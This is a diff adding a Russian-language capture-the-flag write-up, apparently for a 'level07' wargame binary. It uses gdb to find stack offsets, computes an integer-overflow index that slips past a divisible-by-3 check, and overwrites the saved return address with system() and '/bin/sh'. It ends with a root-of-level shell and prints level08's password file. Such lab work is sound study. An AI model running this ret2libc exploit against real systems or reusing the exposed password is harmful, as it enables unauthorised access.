@@ -1,0 +1,75 @@
+Запускаем gdb и ищем eip, ebp, esp, data:
+(gdb) b *main + 6
+(gdb) r
+(gdb) i frame
+
+Stack level 0, frame at 0xffffd710:
+eip = 0x8048729 in main; saved eip 0xf7e45513
+Arglist at 0xffffd708, args:
+Locals at 0xffffd708, Previous frame's sp is 0xffffd710
+Saved registers:
+ebp at 0xffffd708, eip at 0xffffd70c
+(gdb) i reg esp
+esp         0xffffd6fc      0xffffd6fc
+
+0x24(%esp), %eax
+    0x080488e7 <+452>:  mov     %eax,(%esp)
+---Type <return> to continue, or q <return> to quit---
+    0x080488ea <+455>:  call 0x8048630 <store_number>
+
+Предположительно начало буфера находится на esp + 0x24 = 0xFFFFD720.
+Для проверки этого зайдем в store_number и посмотрим, что на входе:
+(gdb) x/4x $ebp+0x8
+0xffffd520: 0x44    0xd5    0xff    0xff  -> 0xffffd544
+
+Из этого следует, что мы не попали и не выделилил стэк.
+Двигаем указатель на *main + 126
+(gdb) i reg esp
+esp         0xffffd520  0xffffd520
+Начало буффера находится на esp + 0x24 = 0xFFFFD544
+
+Посчитаем, сколько нам нужно на eip:
+eip - esp + 0x24 = 456 между началом буфера и eip,
+456 / 4 = 114 чисел типа int
+
+Поскольку в программе при чтении есть проверка на деление на 3, 
+попробуем переполнить int числом, которое не делится на 3 со смещением на 456:
+(4294967296 + 456) / 4 = 1073741938.
+Это смещение гарантирует нам переполнение стэка с заходом на eip
+
+Запускать будем через system("/bin/sh"), найдем system и строку "/bin/sh",
+затрем eip и подадим аргументом строку /bin/sh
+
+(gdb) b *main
+Breakpoint 1 at 0x08048723
+(gdb) r
+Starting program: /home/users/level07/level07
+
+Breakpoint 1, 0x08048723 in main ()
+(gdb) p system
+$1 = {<text variable, no debug info>} 0xf7e6aed0 = 4159090384 <system>
+(gdb) fund &system, + 99999999, "/bin/sh"
+0xf7f897ec = 4160264172
+
+Проходим:
+>./level07
+
+Input command: store
+ Number: 4159090384
+ Index: 1073741938
+ Completed store command successfully
+
+Input command: store
+ Number: 4160264172
+ Index: 116
+ Completed store command successfully
+
+Input command: quit
+
+>whoami
+level08
+
+>cat /home/users/level08/.pass
+7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
+
+
